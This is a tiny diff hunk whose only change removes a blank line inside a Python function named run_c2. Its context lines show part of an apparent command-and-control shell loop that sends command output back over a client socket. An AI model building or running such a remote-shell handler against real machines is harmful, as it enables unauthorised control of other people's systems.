@@ -174,7 +174,6 @@ def run_c2():
                 client_socket.send((out + "\n").encode('utf-8', errors='ignore'))
             except Exception as e:
                 client_socket.send(f"{e}\n".encode('utf-8'))
-                
         except Exception:
             break
 
